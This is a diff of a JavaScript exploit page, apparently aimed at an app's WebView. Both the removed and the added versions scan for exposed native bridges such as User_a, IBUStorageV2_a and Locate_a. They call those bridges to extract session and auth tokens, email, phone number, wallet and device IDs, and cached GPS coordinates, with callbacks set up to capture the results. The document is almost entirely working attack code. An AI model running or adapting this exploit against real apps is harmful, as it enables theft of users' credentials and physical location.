@@ -1,299 +1,66 @@
-<!doctype html>
-<html>
-  <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Critical Voucher Leak & Data Extraction Report</title>
-    <style>
-      body {
-        font-family: Arial, Helvetica, sans-serif;
-        background-color: #000000;
-        color: #ffffff;
-        padding: 15px;
-        margin: 0;
-        font-size: 14px;
-        line-height: 1.5;
-        overflow-x: hidden;
-      }
-      .card {
-        border: 1px solid #1a1a1a;
-        border-radius: 8px;
-        padding: 15px;
-        margin-bottom: 20px;
-        background-color: #0d0d0d;
-        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
-        word-break: break-all;
-      }
-      h3 {
-        color: #4169E1; /* Royal Blue / Dark Blue */
-        border-bottom: 2px solid #4169E1;
-        padding-bottom: 8px;
-        margin-top: 0;
-        font-size: 16px;
-        text-transform: uppercase;
-        font-weight: bold;
-      }
-      .critical-box {
-        border: 2px solid #8B0000;
-        box-shadow: 0 0 10px rgba(139, 0, 0, 0.5);
-      }
-      .critical-title {
-        color: #ff3333;
-        border-bottom-color: #ff3333;
-      }
-      .log-console {
-        background-color: #050505;
-        padding: 12px;
-        border-radius: 5px;
-        border: 1px solid #222;
-        max-height: 250px;
-        overflow-y: auto;
-        font-family: Courier, monospace;
-        font-size: 12px;
-      }
-      .log-entry { margin-bottom: 4px; }
-      .info { color: #aaaaaa; }
-      .error { color: #ff5555; }
-      .success { color: #55aaff; }
-      
-      .leak-row {
-        margin-bottom: 12px;
-        padding-bottom: 12px;
-        border-bottom: 1px solid #222;
-      }
-      .leak-row:last-child {
-        border-bottom: none;
-        margin-bottom: 0;
-        padding-bottom: 0;
-      }
-      .label {
-        font-size: 11px;
-        color: #888888;
-        text-transform: uppercase;
-        display: block;
-        margin-bottom: 4px;
-        font-weight: bold;
-      }
-      .value {
-        font-size: 15px;
-        color: #ffffff;
-        display: block;
-      }
-      .bridge-item {
-        margin-bottom: 6px;
-        display: flex;
-        align-items: center;
-      }
-      .status-dot {
-        width: 8px;
-        height: 8px;
-        border-radius: 50%;
-        background-color: #4169E1;
-        display: inline-block;
-        margin-right: 8px;
-      }
-    </style>
-  </head>
-  <body>
-    <div class="card">
-      <h3>Active Bridges (Targets)</h3>
-      <div id="bridges">
-        <div class="info">Scanning environment...</div>
-      </div>
-    </div>
+<script>
+    function log(msg, critical = false) {
+        var box = document.getElementById('logs');
+        var color = critical ? "#ff4757" : "#2ed573";
+        box.innerHTML += "> <span style='color:"+color+"'>" + msg + "</span><br>";
+    }
 
-    <div class="card critical-box">
-      <h3 class="critical-title">Recovered Critical Data</h3>
-      <div id="leaks">
-        <div class="info">Awaiting extraction sequence...</div>
-      </div>
-    </div>
+    // این بخش بسیار مهم است: شنود تمام توابعی که اپلیکیشن ممکن است صدا بزند
+    window.H5_CALLBACK = function(data) {
+        log("CALLBACK RECEIVED: " + JSON.stringify(data), true);
+        alert("CRITICAL DATA STOLEN: " + JSON.stringify(data));
+    };
 
-    <div class="card">
-      <h3>Execution Log</h3>
-      <div id="logs" class="log-console">
-        <div class="log-entry info">[INFO] System Initialized.</div>
-      </div>
-    </div>
+    function startFinalHeist() {
+        log("Initiating Critical Data Extraction...");
 
-    <script>
-      const logBox = document.getElementById("logs");
-      const leakBox = document.getElementById("leaks");
-      const bridgesBox = document.getElementById("bridges");
-      let leaksRendered = false;
-
-      function logMessage(msg, type = "info") {
-        const div = document.createElement("div");
-        div.className = "log-entry " + type;
-        div.innerText = "[" + type.toUpperCase() + "] " + msg;
-        logBox.appendChild(div);
-        logBox.scrollTop = logBox.scrollHeight;
-      }
-
-      function addLeak(label, value) {
-        if (!leaksRendered) {
-          leakBox.innerHTML = "";
-          leaksRendered = true;
-        }
-        const row = document.createElement("div");
-        row.className = "leak-row";
-        
-        let stringValue = value;
-        if (typeof value === 'object') {
-          stringValue = JSON.stringify(value, null, 2);
-        } else if (value === null || value === undefined || value === "") {
-           stringValue = "null / empty";
-        }
-        
-        row.innerHTML = `<span class="label">${label}</span><span class="value">${stringValue}</span>`;
-        leakBox.appendChild(row);
-      }
-
-      // --- CALLBACK INTERCEPTION ---
-      window.__bridge_callback = function (base64Data) {
-        try {
-          const decodedData = atob(base64Data);
-          const json = JSON.parse(decodedData);
-          
-          let tagname = json.tagname || "Unknown_Callback";
-          logMessage("Intercepted Callback: " + tagname, "success");
-
-          // Target 1: User_a.getUserInfo()
-          if (tagname === "leak_user_info" || (json.param && json.param.UserID)) {
-            const data = json.param || json;
-            if (data.UserID) {
-               addLeak("Target User ID", data.UserID);
-               if (data.Email) addLeak("Email Address", data.Email);
-               if (data.Mobile || data.BindMobile) addLeak("Mobile Number", data.Mobile || data.BindMobile);
-               if (data.Token) addLeak("Session Token", data.Token);
-               if (data.Auth) addLeak("Auth Token", data.Auth);
-               if (data.SAuth) addLeak("SAuth Hash", data.SAuth);
-               logMessage("Critical User Profile Extracted!", "error");
-            }
-          }
-
-          // Target 2: IBUStorageV2_a OR Storage_a Database Values
-          if (json.value || (json.param && typeof json.param.value !== "undefined")) {
-            const val = json.value || json.param.value;
-            const pureTag = tagname.replace("leak_", "");
-            
-            // Try parsing if string JSON
-            let finalVal = val;
-            try { 
-                if (typeof val === "string" && (val.startsWith("{") || val.startsWith("["))) {
-                     finalVal = JSON.parse(val); 
-                }
-            } catch(e) {}
-            
-            addLeak("Database: " + pureTag, finalVal);
-          }
-
-          // Target 3: Util_a version leakage
-          if (tagname === "leak_version" && (Array.isArray(json) || (json.param && Array.isArray(json.param)))) {
-             addLeak("Internal Environment Info", "Package versions retrieved");
-          }
-
-        } catch (e) {
-          logMessage("Callback parsing error: " + e.message, "error");
-        }
-      };
-
-      /**
-       * Safe, non-blocking extraction functions.
-       * We use try-catch and staggered timeouts so a hang in one module
-       * doesn't stop the rest of the extraction process.
-       */
-
-      function extractUserInfo() {
-        if (window.User_a && window.User_a.getUserInfo) {
-          logMessage("Requesting User Profile (User_a)...");
-          try {
-             const cmd = JSON.stringify({ callback_tagname: "leak_user_info" });
-             window.User_a.getUserInfo(cmd);
-          } catch(e) {
-             logMessage("getUserInfo crash: " + e.message, "error");
-          }
-        }
-      }
-
-      function extractStorage() {
-        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-          const targets = [
-            { bus: "common", key: "token" },
-            { bus: "common", key: "uid" },
-            { bus: "user", key: "userInfo" },
-            { bus: "wallet", key: "walletId" },
-            { bus: "h5", key: "device_id" }
-          ];
-          
-          targets.forEach((t, i) => {
-            setTimeout(() => {
-              logMessage("Probing DB [" + t.bus + "] for key: " + t.key);
-              try {
-                const payload = JSON.stringify({
-                  callback_tagname: "leak_" + t.key,
-                  bussiness: t.bus,
-                  key: t.key
-                });
-                window.IBUStorageV2_a.IBUGetUserValue(payload);
-              } catch(e) {
-                logMessage("Storage extraction exception: " + e.message, "error");
-              }
-            }, i * 400 + 500); // Wait half a second before spamming storage
-          });
-        }
-      }
-
-      function extractLocation() {
-        // We delay Location extraction heavily because it caused hangs in previous iterations.
-        // It runs last, 3.5 seconds after everything else.
+        // ۱. اکسپلویت لوکیشن
         if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-           setTimeout(() => {
-              logMessage("Requesting Cached Location (Locate_a)...");
-              try {
-                let locRaw = window.Locate_a.getCachedLocationData();
-                if (locRaw) {
-                   let loc = typeof locRaw === "string" ? JSON.parse(locRaw) : locRaw;
-                   let address = loc.address || "Unknown Address";
-                   let coords = `Lat: ${loc.lat || loc.latitude}, Lng: ${loc.lng || loc.longitude}`;
-                   addLeak("Cached Physical Location", `${address}\n[ ${coords} ]`);
-                   logMessage("Location recovered.", "success");
-                } else {
-                   logMessage("Locate_a returned null/empty.", "info");
+            var loc = window.Locate_a.getCachedLocationData();
+            if (loc) {
+                log("PRIVACY BREACH: GPS coordinates found!");
+                log("LAT: " + loc.lat + " | LNG: " + loc.lng, true);
+            }
+        }
+
+        // ۲. اکسپلویت دیتابیس (ارسال دستور)
+        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+            var payload = JSON.stringify({
+                "action": "IBUGetUserValue",
+                "arguments": { "bussiness": "common", "key": "token" },
+                "callback": "H5_CALLBACK" // نام تابعی که در بالا تعریف کردیم
+            });
+
+            log("Executing IBUGetUserValue...");
+            window.IBUStorageV2_a.IBUGetUserValue(payload);
+            log("Payload sent. Waiting for async callback...");
+        }
+    }
+
+    // بخش اسکنر (بازگردانده شد تا بخش ۱ اسکریپت کار کند)
+    setTimeout(function() {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        var cleanWindow = iframe.contentWindow;
+        var foundBridges = [];
+        var currentProps = Object.getOwnPropertyNames(window);
+        var cleanProps = Object.getOwnPropertyNames(cleanWindow);
+        
+        currentProps.forEach(function(key) {
+            if (cleanProps.indexOf(key) === -1) {
+                if (!['iframe', 'cleanWindow', 'log', 'startFinalHeist', 'H5_CALLBACK'].includes(key)) {
+                    foundBridges.push(key);
                 }
-              } catch (e) {
-                logMessage("Locate_a.getCachedLocationData timed out or crashed.", "error");
-              }
-           }, 3500); 
-        }
-      }
-
-      function startSequence() {
-        logMessage("Starting extraction timeline...", "info");
+            }
+        });
         
-        // 1. Get the most critical info immediately
-        extractUserInfo();
+        var output = document.getElementById('bridges');
+        output.innerHTML = "";
+        foundBridges.forEach(function(bridge) {
+            output.innerHTML += "<li>[+] Exposed: <b>" + bridge + "</b></li>";
+        });
         
-        // 2. Query the DB targets
-        extractStorage();
-        
-        // 3. (Optional/Slow) Location data
-        extractLocation();
-      }
-
-      // Main Entry Point
-      setTimeout(() => {
-        const potentialBridges = ["User_a", "Util_a", "Locate_a", "IBUStorageV2_a", "Log_a", "Storage_a"];
-        const found = potentialBridges.filter(b => typeof window[b] !== "undefined");
-        
-        if (found.length > 0) {
-            bridgesBox.innerHTML = found.map(b => `<div class="bridge-item"><span class="status-dot"></span>${b}</div>`).join("");
-            logMessage(`Found ${found.length} active bridges in scope.`, "success");
-            startSequence();
-        } else {
-            bridgesBox.innerHTML = `<div class="info" style="color:#ff5555;">No targets found in window scope. Context might be insulated.</div>`;
-            logMessage("Extraction aborted. Modules unavailable.", "error");
-        }
-      }, 500);
-    </script>
-  </body>
-</html>
+        startFinalHeist();
+    }, 1500);
+</script>
